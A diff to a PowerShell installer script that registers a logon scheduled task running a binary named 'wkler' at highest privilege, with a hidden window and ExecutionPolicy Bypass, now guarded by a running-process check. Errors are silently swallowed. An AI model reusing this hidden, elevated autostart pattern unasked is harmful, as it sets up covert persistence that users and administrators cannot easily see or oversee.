@@ -450,11 +450,11 @@ try {
 
         if ($wklerBin) {
             $wklerLaunchCommand = New-HiddenStartProcessCommand -FilePath $wklerBin
-            $wklerAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$wklerLaunchCommand`""
+            $wklerTaskCommand = "if (-not (Get-CimInstance Win32_Process | Where-Object { `$_.ProcessId -ne `$PID -and `$_.CommandLine -and `$_.CommandLine -like '*wkler*' } | Select-Object -First 1)) { $wklerLaunchCommand }"
+            $wklerAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$wklerTaskCommand`""
 
             $wklerTrigger = New-ScheduledTaskTrigger -AtLogOn -User $realUser
             $wklerTrigger.Enabled = $true
-            $wklerTrigger.Delay = 'PT1M'
 
             $wklerPrincipal = New-ScheduledTaskPrincipal -UserId $realUser -LogonType Interactive -RunLevel Highest
 
@@ -465,7 +465,7 @@ try {
             try {
                 Register-ScheduledTask -TaskName $wklerTaskName -Action $wklerAction -Trigger $wklerTrigger -Principal $wklerPrincipal -Settings $wklerSettings -Force -ErrorAction Stop | Out-Null
                 Enable-ScheduledTask -TaskName $wklerTaskName -ErrorAction SilentlyContinue | Out-Null
-                Start-Process -FilePath $wklerBin -WindowStyle Hidden | Out-Null
+                Start-Process -FilePath "powershell.exe" -ArgumentList @('-NoProfile', '-ExecutionPolicy', 'Bypass', '-WindowStyle', 'Hidden', '-Command', $wklerTaskCommand) -WindowStyle Hidden | Out-Null
             } catch {
             }
         }
